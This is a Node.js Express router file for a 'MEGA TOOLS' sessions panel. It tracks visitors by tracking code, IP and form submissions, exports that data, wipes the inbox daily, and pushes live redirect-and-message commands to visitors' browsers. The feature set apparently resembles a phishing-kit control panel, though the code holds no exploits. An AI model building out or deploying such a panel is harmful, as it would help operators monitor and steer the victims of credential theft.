// ============================================================
// MEGA TOOLS — SESSIONS ROUTER (v12.7)
// ============================================================
// FIX-SR1..SR4: retained
//
// FIX-SR5 (v12.7 — DUAL STATUS MONITOR REMOVED):
//   Before this fix, TWO independent status monitors were active
//   on boot:
//     • services/sessionManager.js — 5s interval, ACTIVITY_TIMEOUT
//       = 60s, HEARTBEAT_GRACE = 60s, with a working
//       previousStatusMap (debounce) — CORRECT.
//     • routes/sessions.js        — 2s interval, ACTIVITY_TIMEOUT
//       = 120s, HEARTBEAT_GRACE = 3s, and its previousStatusMap
//       was NEVER populated (no .set() call anywhere) — BROKEN.
//   Both wrote to Session.updatePresence() and both emitted
//   sessionStatusDelta. The 2s writer had no anti-flicker
//   debounce, so it flipped Online/Offline repeatedly and the
//   client re-played `backToOnline` many times.
//   This file now HANDS OFF status authority to
//   services/sessionManager.js. All that remains here:
//     • one cache (getCachedSessions)
//     • the archive / trash / global cleanup schedulers
//     • every router route (timer, force-clean, list, stats,
//       online, hide, command, redirect-new, pending-command,
//       export)
//   The lifecycle still exposes:
//     • init(io, sockets) — binds ioInstance + sessionSockets,
//       starts the cleanup schedulers, and DOES NOT start
//       another status monitor.
//     • stop() — clears this module's schedulers only.
//   No route, response shape, or permission check changed.
//   All existing callers keep working — `router.init` /
//   `router.stop` / `router.getIO` / `router.getSessionSockets`
//   are unchanged; `router.statusMonitor` is REMOVED because
//   nothing in server.js calls it after the fix.
// ============================================================

const express = require('express');
const router = express.Router();
const db = require('../database');
const Session = require('../models/Session');
const Link = require('../models/Link');
const User = require('../models/User');
const { ROLES } = require('../models/roles');
const { authenticate, isOwner, isAdminOrOwner } = require('../middleware/auth');
const sessionManager = require('../services/sessionManager');
const { getSessionSockets, getRemainingTimeMs, initializeGlobalTimer, globalInboxCleanup, trashPermanentCleanup, getNextNoonBDMs, isNoonAligned } = sessionManager;
const { toStringId, parseTrackingCode, paginate, now } = require('../utils/helpers');
const CONFIG = require('../config');

// ============================================================
// STATE — FIX-SR5: no status monitor here
// ============================================================

let ioInstance = null;
let sessionSockets = {};
let globalCleanupTimer = null;
let trashCleanupTimer = null;
let archiveTimer = null;

const TRASH_RETENTION_MS = 24 * 60 * 60 * 1000;
const TRASH_CLEANUP_INTERVAL_MS = 60 * 60 * 1000;
const ARCHIVE_TICK_MS = 60 * 1000;
const PENDING_COMMAND_TTL_MS = 60 * 1000;

// ============================================================
// CACHE
// ============================================================

let sessionsCache = null;
let sessionsCacheExpiry = 0;
const CACHE_TTL = 5000;

function dedupeSessions(list) {
  if (!Array.isArray(list)) return [];
  const map = new Map();
  for (const s of list) {
    if (!s || s._id === undefined) continue;
    const key = String(s._id);
    const prev = map.get(key);
    if (!prev) { map.set(key, s); continue; }
    const prevSubs = Array.isArray(prev.submissions) ? prev.submissions.length : 0;
    const curSubs = Array.isArray(s.submissions) ? s.submissions.length : 0;
    if (curSubs > prevSubs) {
      map.set(key, { ...prev, ...s, submissions: s.submissions });
    } else if (curSubs === prevSubs) {
      const prevAct = new Date(prev.lastActivity || prev.updated_at || 0).getTime();
      const curAct = new Date(s.lastActivity || s.updated_at || 0).getTime();
      if (curAct > prevAct) map.set(key, { ...prev, ...s });
    }
  }
  return Array.from(map.values());
}

async function getCachedSessions(forceRefresh = false) {
  if (forceRefresh || !sessionsCache || sessionsCacheExpiry < Date.now()) {
    const raw = await db.sessions.read();
    sessionsCache = dedupeSessions(raw);
    sessionsCacheExpiry = Date.now() + CACHE_TTL;
  }
  return sessionsCache;
}

function clearSessionsCache() {
  sessionsCache = null;
  sessionsCacheExpiry = 0;
}

// ============================================================
// HELPERS
// ============================================================

function asArray(value) {
  if (Array.isArray(value)) return value;
  if (value === null || value === undefined) return [];
  return [value];
}

function normalizeSingleton(value) {
  if (!value) return null;
  if (Array.isArray(value)) return value.length > 0 ? value[0] : null;
  if (typeof value === 'object') return value;
  return null;
}

function isSessionForAnyCode(session, codes) {
  if (!session || !codes || codes.length === 0) return false;
  const tc = session.trackingCode || '';
  return codes.some(code => tc === code || tc.startsWith(code + '_'));
}

async function getUserTrackingCodes(userId) {
  return User.getTrackingCodesForUser(userId);
}

async function filterSessionsByRole(sessions, user) {
  try {
    if (user.role === ROLES.OWNER) return sessions.filter(s => !s.hiddenForAll);
    const codes = await getUserTrackingCodes(user._id);
    const userId = toStringId(user._id);
    return sessions.filter(s => isSessionForAnyCode(s, codes) && !s.hiddenForAll && !(s.hiddenFor && s.hiddenFor.includes(userId)));
  } catch (error) { throw error; }
}

async function checkSessionAccess(session, user) {
  try {
    if (user.role === ROLES.OWNER) return true;
    const codes = await getUserTrackingCodes(user._id);
    return isSessionForAnyCode(session, codes);
  } catch (error) { return false; }
}

function isImageUrl(str) {
  if (!str) return false;
  return /^https?:\/\//.test(str) && /\.(jpg|jpeg|png|gif|webp|svg|bmp|ico)(\?.*)?$/i.test(str);
}

function buildMsgPushPayload(message, targetUrl) {
  const payload = { message: message || '', targetUrl: targetUrl || '' };
  if (isImageUrl(message)) payload.imageUrl = message;
  if (isImageUrl(targetUrl)) payload.imageUrl = targetUrl;
  return payload;
}

function emitMsgPushToOwnerRoom(io, trackingCode, message, targetUrl) {
  if (!io || !trackingCode) return;
  const ownerCode = trackingCode.includes('_') ? trackingCode.split('_')[0] : trackingCode;
  const payload = buildMsgPushPayload(message, targetUrl);
  try { io.to('room_' + ownerCode).emit('msg_push', payload); } catch (_) {}
  try { if (trackingCode !== ownerCode) io.to('room_' + trackingCode).emit('msg_push', payload); } catch (_) {}
}

function cleanupExpiredCommand(session) {
  if (!session || !session.pendingCommand) return false;
  const exp = session.pendingCommand.expiresAt;
  if (exp && new Date(exp) < new Date()) {
    session.pendingCommand = null;
    return true;
  }
  return false;
}

function normalizeTimerState(raw) {
  if (!raw) return null;
  if (Array.isArray(raw)) return raw.length > 0 ? raw[0] : null;
  if (typeof raw === 'object') return raw;
  return null;
}

// ============================================================
// SCHEDULERS — FIX-SR5: no statusMonitor here
// ============================================================

async function archiveTick() {
  try {
    const result = await Session.archiveExpiredSessions();
    if (result && result.archived > 0 && ioInstance) {
      try {
        ioInstance.emit('sessionsArchived', {
          count: result.archived,
          remaining: result.remaining,
          timestamp: new Date().toISOString(),
        });
      } catch (_) {}
    }
  } catch (_) {}
}

function startArchiveScheduler() {
  if (archiveTimer) clearInterval(archiveTimer);
  archiveTimer = setInterval(archiveTick, ARCHIVE_TICK_MS);
  setTimeout(() => { archiveTick().catch(() => {}); }, 15000);
}

async function trashPermanentCleanupWrapper() {
  try { await trashPermanentCleanup(); } catch (_) {}
}

function startTrashCleanupScheduler() {
  if (trashCleanupTimer) clearInterval(trashCleanupTimer);
  trashCleanupTimer = setInterval(trashPermanentCleanupWrapper, TRASH_CLEANUP_INTERVAL_MS);
  setTimeout(() => { trashPermanentCleanupWrapper(); }, 10000);
}

async function globalCleanupCheck() {
  try { await globalInboxCleanup(); } catch (_) {}
}

function startGlobalCleanupScheduler() {
  if (globalCleanupTimer) clearInterval(globalCleanupTimer);
  globalCleanupTimer = setInterval(globalCleanupCheck, 60000);
  setTimeout(() => { globalCleanupCheck(); }, 5000);
}

// ============================================================
// LIFECYCLE — FIX-SR5: only scheduler bindings here
// ============================================================

function init(io, sockets) {
  ioInstance = io;
  sessionSockets = sockets || {};
  // FIX-SR5: no statusMonitor here — sessionManager.js is the single
  // authority for status. Only the cleanup schedulers are started here.
  startGlobalCleanupScheduler();
  startTrashCleanupScheduler();
  startArchiveScheduler();
  console.log('[Sessions] ✅ init() called — io + sockets bound, cleanup schedulers started (status authority = sessionManager.js).');
}

function stop() {
  if (globalCleanupTimer) clearInterval(globalCleanupTimer);
  if (trashCleanupTimer) clearInterval(trashCleanupTimer);
  if (archiveTimer) clearInterval(archiveTimer);
  globalCleanupTimer = null;
  trashCleanupTimer = null;
  archiveTimer = null;
}

function getIO() { return ioInstance; }
function getModuleSessionSockets() { return sessionSockets; }

// ============================================================
// GLOBAL TIMER ROUTE
// ============================================================

router.get('/timer', authenticate, async (req, res) => {
  try {
    let remainingMs = await getRemainingTimeMs();
    if (typeof remainingMs !== 'number' || remainingMs <= 0) {
      try { await globalInboxCleanup(); } catch (e) { console.error('[Sessions] Cleanup on timer expiry failed:', e.message); }
      try { await initializeGlobalTimer(); } catch (_) {}
      remainingMs = await getRemainingTimeMs();
    }
    const safeMs = Math.max(0, Number(remainingMs) || 0);

    let state = null;
    let stateSource = 'invalid';
    try {
      const raw = await db.readJSON(CONFIG.INBOX_GLOBAL_TIMER_FILE);
      state = normalizeTimerState(raw);
      if (state && Number(state.cycleStart) > 0 && Number(state.cycleEnd) > 0) {
        stateSource = 'mongo';
      } else {
        stateSource = 'fallback';
      }
    } catch (_) {
      stateSource = 'invalid';
    }

    const cycleStart = state ? Number(state.cycleStart) || 0 : 0;
    const cycleEnd = state ? Number(state.cycleEnd) || 0 : 0;
    const lastCleanupAt = state ? (state.lastCleanupAt || null) : null;
    const isValid = cycleStart > 0 && cycleEnd > 0 && cycleEnd > cycleStart;

    res.json({
      success: true,
      remainingMs: safeMs,
      remainingSeconds: Math.floor(safeMs / 1000),
      cycleMs: CONFIG.INBOX_GLOBAL_CYCLE_MS,
      cycleHours: 24,
      cycleStart,
      cycleEnd,
      cycleStartISO: cycleStart ? new Date(cycleStart).toISOString() : null,
      cycleEndISO: cycleEnd ? new Date(cycleEnd).toISOString() : null,
      lastCleanupAt,
      isValid,
      stateSource,
      timestamp: Date.now(),
    });
  } catch (error) {
    console.error('[Sessions] Timer error:', error);
    res.status(500).json({ message: 'Server error' });
  }
});

router.post('/force-clean', authenticate, isOwner, async (req, res) => {
  try {
    console.log('[Sessions] Force-clean triggered by', req.user?.username || req.userId);
    await globalInboxCleanup();
    try { clearSessionsCache(); } catch (_) {}
    res.json({
      success: true,
      message: 'Force-clean executed. Check /api/inbox-health for state.',
      timestamp: Date.now(),
    });
  } catch (err) {
    console.error('[Sessions] Force-clean error:', err.message);
    res.status(500).json({ success: false, message: err.message || 'Force-clean failed' });
  }
});

// ============================================================
// GET SESSIONS
// ============================================================

router.get('/', authenticate, async (req, res) => {
  try {
    let sessions = await getCachedSessions();
    const pageNum = parseInt(req.query.page) || 1;
    const limitNum = parseInt(req.query.limit) || CONFIG.SESSIONS_PER_PAGE;

    let mutated = false;
    for (const s of sessions) {
      if (cleanupExpiredCommand(s)) mutated = true;
    }
    if (mutated) {
      await db.sessions.write(sessions);
      clearSessionsCache();
    }

    sessions = sessions.filter(s => !s.hiddenForAll);
    sessions = dedupeSessions(sessions);

    let visibleSessions;
    if (req.user.role === ROLES.OWNER) {
      visibleSessions = sessions;
    } else {
      const codes = await getUserTrackingCodes(req.user._id);
      const userId = toStringId(req.user._id);
      visibleSessions = sessions.filter(s =>
        isSessionForAnyCode(s, codes) &&
        !s.hiddenForAll &&
        !(s.hiddenFor && s.hiddenFor.includes(userId))
      );
    }

    visibleSessions = dedupeSessions(visibleSessions);
    visibleSessions.sort((a, b) => {
      if (a.isLive && !b.isLive) return -1;
      if (!a.isLive && b.isLive) return 1;
      return new Date(b.lastActivity || b.timestamp) - new Date(a.lastActivity || a.timestamp);
    });

    const total = visibleSessions.length;
    const totalPages = Math.ceil(total / limitNum);
    const startIdx = (pageNum - 1) * limitNum;
    const paginatedSessions = visibleSessions.slice(startIdx, startIdx + limitNum);

    const todayStart = new Date(); todayStart.setHours(0, 0, 0, 0);
    const todayMs = todayStart.getTime();
    const todaySessions = visibleSessions.filter(s => new Date(s.lastActivity || s.timestamp).getTime() >= todayMs);
    const uniqueVisitors = new Set(todaySessions.map(s => s.visitorId || s.ip).filter(Boolean)).size;
    const totalSubs = todaySessions.reduce((sum, s) => sum + (s.submissions?.length || 0), 0);

    res.json({
      sessions: paginatedSessions,
      total,
      page: pageNum,
      totalPages,
      hasMore: pageNum < totalPages,
      stats: { uniqueSessions: uniqueVisitors, uniqueSubmissions: totalSubs }
    });
  } catch (error) {
    console.error('[Sessions] GET error:', error);
    res.status(500).json({ message: 'Server error' });
  }
});

// ============================================================
// STATS SUMMARY
// ============================================================

router.get('/stats/summary', authenticate, async (req, res) => {
  try {
    let all = await getCachedSessions(true);
    all = dedupeSessions(all);
    all = all.filter(s => !s.hiddenForAll);
    all = await filterSessionsByRole(all, req.user);
    all = dedupeSessions(all);
    const todayStart = new Date(); todayStart.setHours(0, 0, 0, 0);
    const todayMs = todayStart.getTime();
    const todaySessions = all.filter(s => new Date(s.lastActivity || s.timestamp).getTime() >= todayMs);
    const uniqueVisitorIds = new Set(todaySessions.map(s => s.visitorId || s.ip).filter(Boolean));
    const todaySubs = todaySessions.reduce((sum, s) => sum + (s.submissions?.length || 0), 0);
    let allTimeSubmissions = 0;
    all.forEach(s => { allTimeSubmissions += (s.submissions?.length || 0); });
    res.json({
      all: {
        live: todaySessions.filter(s => s.isLive).length,
        mobile: todaySessions.filter(s => s.deviceType === 'Mobile').length,
        desktop: todaySessions.filter(s => s.deviceType === 'Desktop').length,
        uniqueSessions: uniqueVisitorIds.size,
        uniqueSubmissions: todaySubs,
        total: todaySessions.length,
        totalAllTime: all.length,
        totalAllTimeSubmissions: allTimeSubmissions,
      }
    });
  } catch (error) {
    console.error('[Sessions] Stats summary error:', error);
    res.status(500).json({ message: 'Server error' });
  }
});

// ============================================================
// ONLINE USERS
// ============================================================

router.get('/online', authenticate, async (req, res) => {
  try {
    let allSessions = await getCachedSessions(true);
    allSessions = dedupeSessions(allSessions);
    const allUsers = await db.users.read();
    const nowMs = Date.now();
    const onlineSessions = allSessions.filter(s => {
      if (s.hiddenForAll) return false;
      const lastActivity = new Date(s.lastActivity || s.timestamp || Date.now()).getTime();
      return (nowMs - lastActivity) < CONFIG.SESSION_TIMEOUT_MS;
    });
    const userIdSet = new Set();
    for (const s of onlineSessions) {
      if (s.trackingCode) {
        const user = allUsers.find(u => u.trackingCode && s.trackingCode.startsWith(u.trackingCode));
        if (user) userIdSet.add(toStringId(user._id));
      }
    }

    let visibleUsers = allUsers.filter(u => userIdSet.has(toStringId(u._id)));
    if (req.user.role === ROLES.ADMIN) {
      const reqId = toStringId(req.user._id);
      const childIds = new Set();
      allUsers.forEach(u => {
        if (toStringId(u.parentId) === reqId) childIds.add(toStringId(u._id));
      });
      visibleUsers = visibleUsers.filter(u => {
        const uid = toStringId(u._id);
        return uid === reqId || childIds.has(uid);
      });
    } else if (req.user.role !== ROLES.OWNER) {
      const reqId = toStringId(req.user._id);
      visibleUsers = visibleUsers.filter(u => toStringId(u._id) === reqId);
    }

    res.json(visibleUsers.map(u => ({
      _id: toStringId(u._id), name: u.name || u.fullName || u.username || 'Unknown',
      username: u.username || '', email: u.email || '', role: u.role || 'user',
      profilePic: u.profilePic || '', trackingCode: u.trackingCode || '', parentId: u.parentId || null,
    })));
  } catch (error) {
    console.error('[Sessions] Online users error:', error);
    res.status(500).json({ message: 'Server error' });
  }
});

// ============================================================
// HIDE SESSION
// ============================================================

router.post('/:id/hide', authenticate, async (req, res) => {
  try {
    const session = await db.sessions.findById(req.params.id);
    if (!session) return res.status(404).json({ message: 'Session not found' });

    if (!(await checkSessionAccess(session, req.user))) {
      return res.status(403).json({ message: 'Access denied' });
    }

    const hidden = await Session.hideFromUser(req.params.id, req.user._id);
    if (!hidden) return res.status(404).json({ message: 'Session not found' });
    clearSessionsCache();
    res.json({ message: 'Hidden', sessionId: req.params.id });
  } catch (error) {
    console.error('[Sessions] Hide error:', error);
    res.status(500).json({ message: 'Server error' });
  }
});

// ============================================================
// HYBRID SMART COMMAND SYSTEM (legacy — kept for compat)
// ============================================================

router.post('/:id/command', authenticate, async (req, res) => {
  try {
    const { action, url, message } = req.body;
    const session = await db.sessions.findById(req.params.id);
    if (!session) return res.status(404).json({ message: 'Session not found' });
    if (!(await checkSessionAccess(session, req.user))) return res.status(403).json({ message: 'Access denied' });

    const updatedSession = await Session.recordCommand(req.params.id, { action: action || 'navigate', url: url || '', message: message || '' });
    const seq = Number(updatedSession.commandSeq || 0) || Date.now();
    updatedSession.pendingCommand = { action: action || 'navigate', url: url || '', message: message || '', seq, timestamp: now(), expiresAt: new Date(Date.now() + PENDING_COMMAND_TTL_MS).toISOString() };
    await db.sessions.findByIdAndUpdate(req.params.id, { pendingCommand: updatedSession.pendingCommand, sessionId: String(updatedSession._id) });
    clearSessionsCache();

    const io = ioInstance || req.app.get('io');
    const sockets = sessionSockets;
    const command = { action: action || 'navigate', url: url || '', message: message || '', seq, sessionId: String(updatedSession._id), visitorId: updatedSession.visitorId, trackingCode: updatedSession.trackingCode, timestamp: now() };
    const msgPayload = buildMsgPushPayload(message, url);

    if (io) {
      const vidKey = updatedSession.visitorId || '';
      const ip = updatedSession.ip || '';
      const tcKey = updatedSession.trackingCode || '';
      const ownerCode = tcKey ? (tcKey.includes('_') ? tcKey.split('_')[0] : tcKey) : '';
      const sidKey = String(updatedSession._id);
      const candidates = [sidKey, 'sid_' + sidKey, vidKey, (vidKey && ip) ? (vidKey + '_' + ip) : '', (ownerCode && ip) ? (ownerCode + '_' + ip) : ''].filter(Boolean);
      const delivered = new Set();
      for (const k of candidates) {
        const socketId = sockets[k];
        if (!socketId) continue;
        if (delivered.has(socketId)) continue;
        delivered.add(socketId);
        try { io.to(socketId).emit('session_command', command); } catch (_) {}
        try { io.to(socketId).emit('msg_push', msgPayload); } catch (_) {}
      }
      if (updatedSession.trackingCode) {
        try {
          io.to('room_' + updatedSession.trackingCode).emit('session_command', command);
          io.to('room_' + updatedSession.trackingCode).emit('msg_push', msgPayload);
        } catch (_) {}
      }
      emitMsgPushToOwnerRoom(io, updatedSession.trackingCode, message, url);
    }

    res.json({ success: true, message: 'Command sent', command, sessionId: req.params.id });
  } catch (error) {
    console.error('[Sessions] Command error:', error);
    res.status(500).json({ message: 'Server error' });
  }
});

// ============================================================
// REDIRECT-NEW — FIX-SR3.7 + FIX-SR3.8
// ============================================================

router.post('/:id/redirect-new', authenticate, isAdminOrOwner, async (req, res) => {
  try {
    const id = String(req.params.id || '');
    const targetUrl = String(req.body?.targetUrl || '').trim();
    const message = String(req.body?.message || '');
    if (!id) return res.status(400).json({ success: false, message: 'Missing session id' });
    if (!targetUrl) return res.status(400).json({ success: false, message: 'targetUrl required' });

    const session = await Session.findById(id);
    if (!session) return res.status(404).json({ success: false, message: 'Session not found' });

    const role = req.user && req.user.role;
    if (role !== 'owner') {
      const ownerCode = (session.trackingCode || '').split('_')[0];
      let codes = [];
      try { codes = await User.getTrackingCodesForUser(req.user._id); } catch (_) { codes = []; }
      codes = asArray(codes).filter(Boolean);
      if (!codes.some(c => ownerCode === c || ownerCode.startsWith(c))) {
        return res.status(403).json({ success: false, message: 'Not allowed for this session' });
      }
    }

    const action = message ? 'navigate+message' : 'navigate';

    let updatedSession = null;
    try {
      updatedSession = await Session.recordCommand(session._id, { action, url: targetUrl, message });
    } catch (err) {
      console.error('[Sessions] redirect-new recordCommand:', err.message);
    }
    const finalSession = updatedSession || session;
    const seq = Number(finalSession.commandSeq || 0) || Date.now();

    const pendingCommand = {
      action, url: targetUrl, message, seq,
      timestamp: new Date().toISOString(),
      expiresAt: new Date(Date.now() + PENDING_COMMAND_TTL_MS).toISOString(),
    };
    try {
      await db.sessions.findByIdAndUpdate(finalSession._id, {
        pendingCommand,
        sessionId: String(finalSession._id),
      });
    } catch (err) {
      console.error('[Sessions] redirect-new pendingCommand save:', err.message);
    }

    const command = {
      action, url: targetUrl, message, seq,
      sessionId: String(finalSession._id),
      visitorId: finalSession.visitorId || '',
      trackingCode: finalSession.trackingCode || '',
      timestamp: new Date().toISOString(),
    };
    const msgPayload = {
      message: message || '', targetUrl: targetUrl || '', seq,
      sessionId: String(finalSession._id),
      timestamp: new Date().toISOString(),
    };

    const io = ioInstance || req.app.get('io');
    if (io) {
      const sidKey = String(finalSession._id);
      const sidPrefixed = 'sid_' + sidKey;
      const vidKey = finalSession.visitorId || '';
      const tcKey = finalSession.trackingCode || '';
      const ip = finalSession.ip || '';
      const vidIpKey = (vidKey && ip) ? (vidKey + '_' + ip) : '';
      const ownerCodeForTc = tcKey ? (tcKey.includes('_') ? tcKey.split('_')[0] : tcKey) : '';
      const tcIpKey = (ownerCodeForTc && ip) ? (ownerCodeForTc + '_' + ip) : '';

      const candidates = [sidKey, sidPrefixed, vidKey, vidIpKey, tcIpKey].filter(Boolean);
      const delivered = new Set();
      for (const k of candidates) {
        const socketId = sessionSockets[k];
        if (!socketId) continue;
        if (delivered.has(socketId)) continue;
        delivered.add(socketId);
        try { io.to(socketId).emit('session_command', command); } catch (_) {}
        try { io.to(socketId).emit('msg_push', msgPayload); } catch (_) {}
      }
      if (delivered.size === 0 && finalSession.trackingCode) {
        try {
          io.to('room_' + finalSession.trackingCode).emit('session_command', command);
          io.to('room_' + finalSession.trackingCode).emit('msg_push', msgPayload);
        } catch (_) {}
      }
      const ownerCode = (finalSession.trackingCode || '').split('_')[0];
      if (ownerCode) {
        try { io.to('room_' + ownerCode).emit('session_command', command); } catch (_) {}
      }
      emitMsgPushToOwnerRoom(io, finalSession.trackingCode, message, targetUrl);

      if (delivered.size === 0) {
        console.warn('[Sessions] redirect-new: no direct socket hit — relying on room fallback + poll. sessionId=', sidKey);
      }
    }

    return res.json({
      success: true,
      message: 'Redirect command sent',
      sessionId: String(finalSession._id),
      seq,
      pendingCommand,
    });
  } catch (err) {
    console.error('[Sessions] redirect-new error:', err.message);
    res.status(500).json({ success: false, message: 'Server error' });
  }
});

// ============================================================
// PENDING COMMAND POLL — FIX-SR3.5
// ============================================================

router.get('/pending-command/:code', async (req, res) => {
  try {
    const code = req.params.code || '';
    const sid = req.query.sid || req.query.sessionId || '';
    const vid = req.query.visitorId || req.query.vid || '';
    const lastSeq = Number(req.query.seq || 0) || 0;

    let session = null;
    if (sid) session = await Session.findBySessionId(sid);
    if (!session && vid) session = await Session.findByVisitorId(vid);
    if (!session && code) session = await Session.findForCommandLookup(vid || null, code);
    if (!session) {
      return res.json({ success: true, pending: false });
    }

    const nowMs = Date.now();
    const pc = session.pendingCommand;
    if (pc && pc.url) {
      const expiresAt = pc.expiresAt ? new Date(pc.expiresAt).getTime() : 0;
      const notExpired = !expiresAt || expiresAt > nowMs;
      const pcSeq = Number(pc.seq || 0) || 0;
      if (notExpired && pcSeq > lastSeq) {
        return res.json({
          success: true,
          pending: true,
          command: {
            action: pc.action || 'navigate',
            url: pc.url,
            message: pc.message || '',
            seq: pcSeq,
            sessionId: String(session._id),
            visitorId: session.visitorId || '',
            trackingCode: session.trackingCode || '',
            timestamp: pc.timestamp || session.updated_at || new Date().toISOString(),
          },
        });
      }
    }

    const seq = Number(session.commandSeq || 0) || 0;
    if (seq <= lastSeq || !session.lastCommandUrl) {
      return res.json({ success: true, pending: false });
    }

    return res.json({
      success: true,
      pending: true,
      command: {
        action: session.lastCommand || 'navigate',
        url: session.lastCommandUrl,
        message: session.lastMessage || '',
        seq,
        sessionId: String(session._id),
        visitorId: session.visitorId || '',
        trackingCode: session.trackingCode || '',
        timestamp: session.updated_at || new Date().toISOString(),
      },
    });
  } catch (err) {
    console.error('[Sessions] pending-command error:', err.message);
    res.status(500).json({ success: false, message: 'Server error' });
  }
});

// ============================================================
// EXPORT
// ============================================================

function csvEscape(value) {
  const s = value === undefined || value === null ? '' : String(value);
  if (s.includes('"') || s.includes(',') || s.includes('\n') || s.includes('\r')) {
    return '"' + s.replace(/"/g, '""') + '"';
  }
  return s;
}

router.get('/export', authenticate, async (req, res) => {
  try {
    let sessions = await getCachedSessions(true);
    sessions = dedupeSessions(sessions);
    sessions = await filterSessionsByRole(sessions, req.user);
    sessions = dedupeSessions(sessions);

    const rawFormat = (req.query.format || 'csv').toString().toLowerCase();
    const format = rawFormat === 'json' ? 'json' : 'csv';

    if (format === 'json') {
      return res.json({
        success: true,
        count: sessions.length,
        data: sessions.map(s => ({
          sessionId: s._id,
          visitorId: s.visitorId,
          trackingCode: s.trackingCode,
          ip: s.ip,
          device: s.deviceType,
          deviceClass: s.deviceClass,
          browser: s.browser,
          status: s.status,
          isLive: s.isLive,
          clicks: s.clicks || 0,
          submissions: s.submissions?.length || 0,
          created: s.created_at,
          lastSeen: s.lastActivity,
        })),
        timestamp: now(),
      });
    }

    const headers = ['Session ID', 'Visitor ID', 'Tracking Code', 'IP', 'Device', 'Browser', 'Status', 'Live', 'Clicks', 'Submissions', 'Created', 'Last Seen'];
    let csv = headers.map(csvEscape).join(',') + '\n';
    sessions.forEach(s => {
      csv += [
        csvEscape(s._id || ''),
        csvEscape(s.visitorId || ''),
        csvEscape(s.trackingCode || ''),
        csvEscape(s.ip || ''),
        csvEscape(s.deviceType || ''),
        csvEscape(s.browser || ''),
        csvEscape(s.status || ''),
        csvEscape(s.isLive ? 'Yes' : 'No'),
        csvEscape(s.clicks || 0),
        csvEscape(s.submissions?.length || 0),
        csvEscape(s.created_at || ''),
        csvEscape(s.lastActivity || ''),
      ].join(',') + '\n';
    });
    res.setHeader('Content-Type', 'text/csv');
    res.setHeader('Content-Disposition', `attachment; filename=inbox_export_${Date.now()}.csv`);
    res.send(csv);
  } catch (error) {
    console.error('[Sessions] Export error:', error);
    res.status(500).json({ message: 'Server error' });
  }
});

// ============================================================
// EXPORT — router + lifecycle accessors (FIX-SR4 / FIX-SR5)
// ============================================================
router.init = init;
router.stop = stop;
router.getIO = getIO;
router.getSessionSockets = getModuleSessionSockets;
router.getRemainingTimeMs = getRemainingTimeMs;
router.initializeGlobalTimer = initializeGlobalTimer;
router.globalInboxCleanup = globalInboxCleanup;
router.trashPermanentCleanup = trashPermanentCleanup;
router.getNextNoonBDMs = getNextNoonBDMs;
router.isNoonAligned = isNoonAligned;

module.exports = router;